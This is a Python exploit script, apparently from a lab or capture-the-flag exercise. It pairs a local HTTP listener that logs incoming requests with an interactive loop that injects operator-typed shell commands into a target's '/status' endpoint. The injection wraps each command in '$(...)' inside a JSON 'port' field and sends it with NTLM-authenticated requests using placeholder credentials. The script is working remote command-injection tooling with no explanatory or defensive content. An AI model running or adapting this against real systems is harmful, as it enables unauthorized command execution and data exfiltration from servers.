import os,sys,re
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from requests import Session
from requests_ntlm import HttpNtlmAuth

# Define an HTTP request handler that prints incoming requests.
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n[HTTP] Received GET request:")
        print("Path:", self.path)
        print("Headers:", self.headers)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        print("\n[HTTP] Received POST request:")
        print("Path:", self.path)
        print("Headers:", self.headers)
        print("Body:", body.decode())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    
    def log_message(self, format, *args):
        # Suppress default logging
        return

def start_http_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print(f"[*] HTTP server listening on port {port}...")
    httpd.serve_forever()

def send_injection(cmd):
    # Build the injection payload with anonymized host and port details.
    payload = {
        "protocol": "http",
        "host": "server.example.local",  # Anonymized target host
        "port": f"5000/?q=$({cmd})"
    }
    target_url = "http://10.0.0.2:5000/status"  # Anonymized target URL
    
    print(f"\n[*] Sending injection payload with command: {cmd}")
    with Session() as s:
        # NTLM authentication using anonymized credentials.
        s.auth = HttpNtlmAuth("EXAMPLE.LOCAL\\username", "password123")
        try:
            rsp = s.post(target_url, json=payload)
            print("[*] Response from injection endpoint:")
            print(rsp.text)
        except Exception as e:
            print(f"[!] Error sending payload: {e}")

def interactive_prompt():
    print("\nInteractive command prompt. Type 'exit' to quit.")
    while True:
        try:
            cmd = input("Enter command to inject: ").strip()
            if cmd.lower() in ["exit", "quit"]:
                break
            if not cmd:
                continue
            send_injection(cmd)
        except KeyboardInterrupt:
            print("\n[!] KeyboardInterrupt detected. Exiting prompt.")
            break

if __name__ == "__main__":
    # Start the local HTTP server in a separate thread.
    server_thread = threading.Thread(target=start_http_server, args=(8000,), daemon=True)
    server_thread.start()

    # Start the interactive prompt to continuously submit commands.
    interactive_prompt()

    print("[*] Shutting down.")
